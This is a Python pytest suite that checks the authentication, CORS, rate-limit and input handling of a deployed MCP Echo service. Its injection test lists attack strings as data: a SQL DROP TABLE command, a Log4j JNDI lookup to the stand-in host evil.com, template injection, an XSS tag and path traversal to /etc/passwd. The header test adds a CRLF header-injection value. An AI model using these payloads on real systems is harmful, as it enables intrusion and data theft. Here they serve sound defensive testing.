"""Sacred MCP Echo Security Tests - Following the divine security commandments!
Tests that Echo service properly enforces OAuth security and authentication.
NO MOCKING - testing real security against deployed service!
"""

import json
import time
from typing import Any

import httpx
import jwt
import pytest


class TestMCPEchoSecurity:
    """Test MCP Echo service security and authentication enforcement."""

    @pytest.mark.asyncio
    async def test_echo_rejects_all_unauthenticated_methods(
        self, http_client: httpx.AsyncClient, mcp_echo_url: str
    ):
        """Test that ALL MCP methods require authentication - no exceptions!"""
        methods = [
            ("initialize", {
                "protocolVersion": "2025-06-18",
                "capabilities": {},
                "clientInfo": {"name": "security-test", "version": "1.0.0"}
            }),
            ("tools/list", {}),
            ("tools/call", {
                "name": "echo",
                "arguments": {"message": "test"}
            }),
            ("resources/list", {}),
            ("prompts/list", {}),
        ]

        for method, params in methods:
            response = await http_client.post(
                mcp_echo_url,
                json={
                    "jsonrpc": "2.0",
                    "method": method,
                    "params": params,
                    "id": f"unauth-{method}"
                },
                headers={
                    "Accept": "application/json, text/event-stream",
                    "Content-Type": "application/json"
                }
            )

            assert response.status_code == 401, f"Method {method} must require authentication"
            assert response.headers.get("WWW-Authenticate") == "Bearer"

    @pytest.mark.asyncio
    async def test_echo_rejects_invalid_bearer_tokens(
        self, http_client: httpx.AsyncClient, mcp_echo_url: str
    ):
        """Test that Echo service rejects various invalid token formats."""
        invalid_tokens = [
            "invalid_token",
            "Bearer",  # Just the word Bearer
            "Basic dXNlcjpwYXNz",  # Basic auth instead of Bearer
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",  # Malformed JWT
            "",  # Empty token
        ]

        for token in invalid_tokens:
            # Handle empty token case specially
            auth_header = "Bearer" if token == "" else f"Bearer {token}"

            response = await http_client.post(
                mcp_echo_url,
                json={
                    "jsonrpc": "2.0",
                    "method": "tools/list",
                    "params": {},
                    "id": "invalid-token-test"
                },
                headers={
                    "Authorization": auth_header,
                    "Accept": "application/json, text/event-stream",
                    "Content-Type": "application/json"
                }
            )

            assert response.status_code == 401, f"Should reject invalid token: {token[:20]}..."

    @pytest.mark.asyncio
    async def test_echo_rejects_expired_tokens(
        self, http_client: httpx.AsyncClient, mcp_echo_url: str
    ):
        """Test that Echo service rejects expired JWT tokens."""
        # Create an expired JWT (this is just for testing rejection)
        expired_payload = {
            "sub": "test-user",
            "exp": int(time.time()) - 3600,  # Expired 1 hour ago
            "iat": int(time.time()) - 7200,  # Issued 2 hours ago
        }

        # Create a fake expired token (won't have valid signature but that's OK for this test)
        expired_token = jwt.encode(expired_payload, "fake-secret", algorithm="HS256")

        response = await http_client.post(
            mcp_echo_url,
            json={
                "jsonrpc": "2.0",
                "method": "tools/list",
                "params": {},
                "id": "expired-token-test"
            },
            headers={
                "Authorization": f"Bearer {expired_token}",
                "Accept": "application/json, text/event-stream",
                "Content-Type": "application/json",
                "MCP-Protocol-Version": "2025-06-18"
            }
        )

        assert response.status_code == 401

    @pytest.mark.asyncio
    async def test_echo_validates_token_with_auth_service(
        self, http_client: httpx.AsyncClient, mcp_echo_url: str, gateway_auth_headers: dict
    ):
        """Test that Echo service properly validates tokens through ForwardAuth."""
        # Valid token should work
        response = await http_client.post(
            mcp_echo_url,
            json={
                "jsonrpc": "2.0",
                "method": "tools/list",
                "params": {},
                "id": "valid-token-test"
            },
            headers={
                **gateway_auth_headers,
                "Accept": "application/json, text/event-stream",
                "Content-Type": "application/json",
                "MCP-Protocol-Version": "2025-06-18"
            }
        )

        assert response.status_code == 200

    @pytest.mark.asyncio
    async def test_echo_cors_security(
        self, http_client: httpx.AsyncClient, mcp_echo_url: str
    ):
        """Test CORS security - preflight should work but actual requests need auth."""
        origin = "https://malicious-site.com"

        # Preflight should work without auth
        preflight_response = await http_client.options(
            mcp_echo_url,
            headers={
                "Origin": origin,
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "content-type,authorization"
            }
        )

        assert preflight_response.status_code == 200

        # But actual POST should require auth even with CORS headers
        post_response = await http_client.post(
            mcp_echo_url,
            json={
                "jsonrpc": "2.0",
                "method": "tools/list",
                "params": {},
                "id": "cors-test"
            },
            headers={
                "Origin": origin,
                "Content-Type": "application/json",
                "Accept": "application/json, text/event-stream"
            }
        )

        assert post_response.status_code == 401

    @pytest.mark.asyncio
    async def test_echo_header_injection_protection(
        self, http_client: httpx.AsyncClient, mcp_echo_url: str, gateway_auth_headers: dict
    ):
        """Test that the HTTP client prevents header injection attacks."""
        import httpx
        import pytest

        # Test 1: Verify that httpx prevents CRLF injection in header values
        with pytest.raises(httpx.LocalProtocolError):
            await http_client.post(
                mcp_echo_url,
                json={"test": "data"},
                headers={
                    **gateway_auth_headers,
                    "X-Injected-Value": "malicious\r\nX-Evil: injected",  # Should be rejected
                    "Accept": "application/json, text/event-stream",
                    "Content-Type": "application/json"
                }
            )

        # Test 2: Verify safe headers work normally
        safe_response = await http_client.post(
            mcp_echo_url,
            json={
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": {
                    "name": "printHeader",
                    "arguments": {}
                },
                "id": "safe-test"
            },
            headers={
                **gateway_auth_headers,
                "X-Safe-Header": "safe_value_no_injection",
                "Accept": "application/json, text/event-stream",
                "Content-Type": "application/json",
                "MCP-Protocol-Version": "2025-06-18"
            }
        )

        # Safe headers should work fine
        assert safe_response.status_code == 200

    @pytest.mark.asyncio
    async def test_echo_oauth_token_scopes(
        self, http_client: httpx.AsyncClient, mcp_echo_url: str, gateway_auth_headers: dict
    ):
        """Test that Echo service respects OAuth token scopes if present."""
        # This test assumes the gateway token has proper scopes
        response = await http_client.post(
            mcp_echo_url,
            json={
                "jsonrpc": "2.0",
                "method": "tools/list",
                "params": {},
                "id": "scope-test"
            },
            headers={
                **gateway_auth_headers,
                "Accept": "application/json, text/event-stream",
                "Content-Type": "application/json",
                "MCP-Protocol-Version": "2025-06-18"
            }
        )

        assert response.status_code == 200

    @pytest.mark.asyncio
    async def test_echo_rate_limiting_protection(
        self, http_client: httpx.AsyncClient, mcp_echo_url: str, gateway_auth_headers: dict
    ):
        """Test that Echo service is protected by rate limiting."""
        # Make many rapid requests
        responses = []
        for i in range(20):
            response = await http_client.post(
                mcp_echo_url,
                json={
                    "jsonrpc": "2.0",
                    "method": "tools/call",
                    "params": {
                        "name": "echo",
                        "arguments": {"message": f"rapid-{i}"}
                    },
                    "id": f"rate-{i}"
                },
                headers={
                    **gateway_auth_headers,
                    "Accept": "application/json, text/event-stream",
                    "Content-Type": "application/json"
                }
            )
            responses.append(response.status_code)

        # Should handle all requests (rate limiting might be at gateway level)
        assert all(status in [200, 429] for status in responses)

    @pytest.mark.asyncio
    async def test_echo_large_payload_protection(
        self, http_client: httpx.AsyncClient, mcp_echo_url: str, gateway_auth_headers: dict
    ):
        """Test that Echo service handles large payloads safely."""
        # Create a large message (1MB)
        large_message = "x" * (1024 * 1024)

        response = await http_client.post(
            mcp_echo_url,
            json={
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": {
                    "name": "echo",
                    "arguments": {"message": large_message}
                },
                "id": "large-payload"
            },
            headers={
                **gateway_auth_headers,
                "Accept": "application/json, text/event-stream",
                "Content-Type": "application/json",
                "MCP-Protocol-Version": "2025-06-18"
            },
            timeout=30.0  # Longer timeout for large payload
        )

        # Should either handle it or reject with appropriate error
        assert response.status_code in [200, 413, 400]

    @pytest.mark.asyncio
    async def test_echo_sql_injection_protection(
        self, http_client: httpx.AsyncClient, mcp_echo_url: str, gateway_auth_headers: dict
    ):
        """Test that Echo service is safe from injection attacks in tool arguments."""
        # Try various injection patterns
        injection_attempts = [
            "'; DROP TABLE users; --",
            "${jndi:ldap://evil.com/a}",  # Log4j style
            "{{7*7}}",  # Template injection
            "<img src=x onerror=alert(1)>",  # XSS
            "../../../etc/passwd",  # Path traversal
        ]

        for attempt in injection_attempts:
            response = await http_client.post(
                mcp_echo_url,
                json={
                    "jsonrpc": "2.0",
                    "method": "tools/call",
                    "params": {
                        "name": "echo",
                        "arguments": {"message": attempt}
                    },
                    "id": f"injection-{injection_attempts.index(attempt)}"
                },
                headers={
                    **gateway_auth_headers,
                    "Accept": "application/json, text/event-stream",
                    "Content-Type": "application/json"
                }
            )

            assert response.status_code == 200

            # Echo should return the exact string safely
            data = self._parse_sse_response(response.text)
            assert data["result"]["content"][0]["text"] == attempt

    @pytest.mark.asyncio
    async def test_echo_forwardauth_header_validation(
        self, http_client: httpx.AsyncClient, mcp_echo_url: str, gateway_auth_headers: dict
    ):
        """Test that ForwardAuth headers are properly passed through."""
        response = await http_client.post(
            mcp_echo_url,
            json={
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": {
                    "name": "printHeader",
                    "arguments": {}
                },
                "id": "forwardauth-test"
            },
            headers={
                **gateway_auth_headers,
                "Accept": "application/json, text/event-stream",
                "Content-Type": "application/json",
                "MCP-Protocol-Version": "2025-06-18"
            }
        )

        assert response.status_code == 200

        data = self._parse_sse_response(response.text)
        headers_text = data["result"]["content"][0]["text"].lower()

        # Should see evidence of ForwardAuth processing
        assert "authorization: bearer" in headers_text
        # Might also see X-User-Id, X-User-Name etc from ForwardAuth

    # Helper methods
    def _parse_sse_response(self, sse_text: str) -> dict[str, Any]:
        """Parse SSE response to extract JSON data."""
        for line in sse_text.strip().split('\n'):
            if line.startswith('data: '):
                return json.loads(line[6:])
        raise ValueError("No data found in SSE response")
